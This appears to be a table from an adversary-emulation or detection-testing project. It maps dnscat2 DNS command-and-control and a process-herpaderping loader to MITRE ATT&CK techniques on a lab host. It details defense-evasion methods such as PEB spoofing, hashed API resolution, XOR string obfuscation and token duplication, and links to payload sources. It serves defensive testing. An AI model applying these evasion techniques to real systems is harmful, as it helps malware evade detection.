| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads are encrypted after dnscat2 session key negotiation | Not Calibrated - Not Benign | dnscat2 encrypts C2 session data; protocol details are covered in [dnscat2.md](further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Discovery | T1012 | Query Registry | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) reads the `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` registry key via `RegOpenKeyEx` API | Calibrated - Not Benign | dnscat2 enumerates all TCP/IP interface GUIDs and reads `NameServer` / `DhcpNameServer` registry values to discover the DNS resolver for C2 domain tunneling | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with `CREATE_NO_WINDOW` (`0x08000000`); dnscat2 executes without a console window | Calibrated - Not Benign | The escalation and C2 launch run without visible console windows; implementation details are covered in [efspotato.md](further-reading/efspotato.md) and [dnscat2.md](further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../resources/payloads/EfsPotato/CertEnrollSvc.cs), [dnscat2 build flags](../resources/payloads/dnscat2/go-client) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | `CertEnrollAgent.exe` creates spoofed `RTL_USER_PROCESS_PARAMETERS`, writes them into the ghost process with `NtAllocateVirtualMemory` / `NtWriteVirtualMemory`, and patches `remotePEB->ProcessParameters` with `WriteProcessMemory` so subsequent inspection shows `RuntimeBroker.exe` metadata | Calibrated - Not Benign | CWLHerpaderping rewrites the ghost process PEB metadata after process creation to hide the true payload identity; this row captures the parameter/PEB spoofing mechanism rather than the trusted-looking name itself | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` resolves native API addresses via PEB walk and DJB2 EAT hash lookup instead of static imports | Not Calibrated - Not Benign | CWLHerpaderping uses hash-based API resolution; implementation details are covered in [process-herpaderping.md](further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [api_hash.h](../resources/payloads/CWLHerpaderping/CWLHerpaderping/api_hash.h) | -
| Defense Evasion | T1027.002 | Obfuscated Files or Information: Software Packing | Windows | `CertEnrollAgent.exe` contains no plaintext references to `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `RuntimeBroker.exe`, `svchost.exe`, `wininit.exe`, `ntdll.dll`, `kernel32.dll` in its static strings section; strings are XOR-decoded at runtime via compile-time template expansion — static string analysis and YARA signatures based on these literals produce no match | Not Calibrated - Not Benign | `CertEnrollAgent.exe` uses compile-time XOR obfuscation (`obfstr.h`) to encrypt all sensitive API names, DLL names, PPID spoof targets, and masquerade paths at compile time with XOR key `0x5A`; strings are decrypted onto the stack at runtime via `constexpr` template expansion — no plaintext string literals visible in the `.rdata` section of the PE binary | react.testlab.local | NT AUTHORITY\SYSTEM | [obfstr.h](../resources/payloads/CWLHerpaderping/CWLHerpaderping/obfstr.h), [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information, while CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Defense Evasion | T1134 | Access Token Manipulation | Windows | `CertEnrollAgent.exe` assigns a duplicate of its own SYSTEM primary token to the ghost process | Not Calibrated - Not Benign | Token fixup keeps the ghost process in the expected SYSTEM context after PPID spoofing; implementation details are covered in [process-herpaderping.md](further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
